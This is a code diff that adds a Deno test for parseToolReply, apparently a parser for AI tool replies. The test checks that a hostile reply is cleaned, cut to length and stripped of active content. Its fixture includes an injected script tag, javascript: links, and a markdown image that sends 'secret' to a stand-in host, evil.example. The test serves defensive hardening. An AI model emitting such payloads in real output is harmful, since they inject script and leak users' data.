@@ -68,3 +68,18 @@ Deno.test("parseToolReply: JSON that is not the contract is treated as plain tex
   assertEquals(r.structured, false); assertEquals(r.answer, '{"foo":1}');
   assertEquals(parseToolReply('{"status":"bogus","answer":"x"}').structured, false);
 });
+
+Deno.test("parseToolReply: a hostile tool reply is bounded, cleaned and stripped of active content", () => {
+  const r = parseToolReply(JSON.stringify({ status: "done", answer: "Hi <script>steal()</script>there [x](javascript:alert(1)) ![p](https://evil.example/a.png?q=secret)\u0000", links: [{ url: "javascript:alert(1)", label: "bad" }, { url: "https://ok.example/a", label: "good" }], extra: "dropped" }));
+  if (!r.structured || r.status !== "done") throw new Error("not read");
+  if (/script|javascript:|evil\.example|\u0000/.test(r.answer)) throw new Error(r.answer);
+  if (!r.answer.includes("good: https://ok.example/a") || r.answer.includes("bad")) throw new Error(r.answer);
+  const huge = parseToolReply(JSON.stringify({ status: "done", answer: "x".repeat(500_000) }));
+  if (huge.answer.length > 60_000) throw new Error("not cut");
+  const unknownStatus = parseToolReply('{"status":"hacked","answer":"a"}');
+  if (unknownStatus.structured) throw new Error("an unknown status is plain text");
+  const deep = parseToolReply('{"status":"done","answer":"a","x":' + "[".repeat(1000) + "]".repeat(1000) + "}");
+  if (deep.structured && deep.answer !== "a") throw new Error("deep");
+  const nul = parseToolReply("plain\u0000 text \u202Ehere");
+  if (nul.answer !== "plain text here") throw new Error(JSON.stringify(nul.answer));
+});
